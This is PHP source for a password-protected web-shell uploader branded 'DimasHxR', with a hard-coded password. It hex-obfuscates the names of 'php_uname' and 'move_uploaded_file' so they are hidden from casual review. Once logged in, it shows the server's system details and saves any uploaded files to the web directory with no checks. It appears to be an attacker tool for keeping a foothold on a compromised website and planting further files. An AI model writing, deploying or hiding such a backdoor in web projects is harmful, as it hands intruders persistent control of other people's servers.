<?php
session_start();

$valid_password_hash = password_hash('dimas', PASSWORD_DEFAULT);

if (isset($_GET['logout'])) {
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit();
}

if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
    if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['login'])) {
        $password = $_POST['password'] ?? '';
        
        if (password_verify($password, $valid_password_hash)) {
            $_SESSION['loggedin'] = true;
        } else {
            $login_error = "Password salah!";
        }
    }
    
    if (!isset($_SESSION['loggedin']) || $_SESSION['loggedin'] !== true) {
        ?>
        <!DOCTYPE html>
        <html>
        <head>
            <meta charset="utf-8">
            <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
            <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
            <title>Login Required</title>
            <style>
                body {
                    background-color: #f8f9fa;
                }
                .login-container {
                    max-width: 400px;
                    margin: 100px auto;
                    padding: 30px;
                    background-color: white;
                    border-radius: 10px;
                    box-shadow: 0 0 20px rgba(0,0,0,0.1);
                }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="login-container">
                    <h2 class="text-center mb-4"><i class="fas fa-lock"></i> Login Required</h2>
                    
                    <?php if (isset($login_error)): ?>
                        <div class="alert alert-danger"><?= htmlspecialchars($login_error) ?></div>
                    <?php endif; ?>
                    
                    <form method="post">
                        <div class="mb-3">
                            <label for="password" class="form-label">Password</label>
                            <div class="input-group">
                                <span class="input-group-text"><i class="fas fa-key"></i></span>
                                <input type="password" class="form-control" id="password" name="password" required>
                            </div>
                        </div>
                        <div class="d-grid gap-2">
                            <button type="submit" name="login" class="btn btn-primary">
                                <i class="fas fa-sign-in-alt"></i> Login
                            </button>
                        </div>
                    </form>
                </div>
            </div>
        </body>
        </html>
        <?php
        exit();
    }
}

$main = [
    "55706C6F61646572",
    "44696D6173487852",
    "7068705F756E616D65",
    "6D6F76655F75706C6F616465645F66696C65"
];

for ($i = 0; $i < count($main); $i++) {
    $bd[$i] = uh($main[$i]);
}

function uh($hex){
    $string='';
    for ($i=0; $i < strlen($hex)-1; $i+=2){
        $string .= chr(hexdec($hex[$i].$hex[$i+1]));
    }
    return $string;
}
?>
<!DOCTYPE html>
<html>
    <head>
        <meta charset="utf-8">
        <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
        <link rel="stylesheet" href="https://pro.fontawesome.com/releases/v5.10.0/css/all.css" integrity="sha384-AYmEC3Yw5cVb3ZcuHtOA93w35dYTsvhLPVnYs9eStHfGJvOvKxVfELGroGkvsg+p" crossorigin="anonymous"/>
        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lobster">
        <title><?= $bd[0] ?></title>
        <style>
            h1{
                font-family: Lobster;
            }
            .user-info {
                position: absolute;
                top: 20px;
                right: 20px;
                background-color: #f8f9fa;
                padding: 8px 15px;
                border-radius: 5px;
                font-size: 14px;
            }
            .logout-btn {
                margin-left: 10px;
                font-size: 12px;
            }
        </style>
    </head>
    <body>
        <div class="user-info">
            <i class="fas fa-user"></i> Admin
            <a href="?logout=1" class="btn btn-sm btn-outline-danger logout-btn">
                <i class="fas fa-sign-out-alt"></i> Logout
            </a>
        </div>
        
        <div class="container">
            <br><br><br><br><br>
            <table width="100%">
                <td>
                    <center>
                        <h1><?= $bd[1] ?></h1>
                        <?= $bd[2]() ?>
                    </center>
                    <br>
                    <div class="d-flex justify-content-center align-items-center">
                        <form method="post" enctype="multipart/form-data">
                            <div class="row">
                                <div class="col-md-9 mb-3">
                                    <input type="file" class="form-control form-control-sm" name="uploadfile[]" multiple aria-label="Upload">
                                </div>
                                <div class="col-md-3">
                                    <button type="submit" class="btn btn-primary btn-sm">Submit</button>
                                </div>
                            </div>
                        </form>
                    </div>
                    <?php
                        if (isset($_FILES['uploadfile'])) {
                            $total = count($_FILES['uploadfile']['name']);
                            for ($i = 0; $i < $total; $i++) {
                                $mainupload = $bd[3]($_FILES['uploadfile']['tmp_name'][$i], $_FILES['uploadfile']['name'][$i]);
                            }
                            if ($total < 2) {
                                if ($mainupload) {
                                    echo("<center><div class='col-md-3'><div class='alert alert-success' role='alert'>Upload File Successfully!</div></div></center>");
                                } else {
                                    echo("<center><div class='col-md-3'><div class='alert alert-danger' role='alert'>Upload File Failed</div></div></center>");
                                }
                            }
                            else{
                                if ($mainupload) {
                                    echo("<center><div class='col-md-3'><div class='alert alert-success' role='alert'>Upload $i Files Successfully!</div></div></center>");
                                } else {
                                    echo("<center><div class='col-md-3'><div class='alert alert-danger' role='alert'>Upload File Failed</div></div></center>");
                                }
                            }
                        }
                    ?>
                </td>
            </table>
        </div>
    </body>
</html>
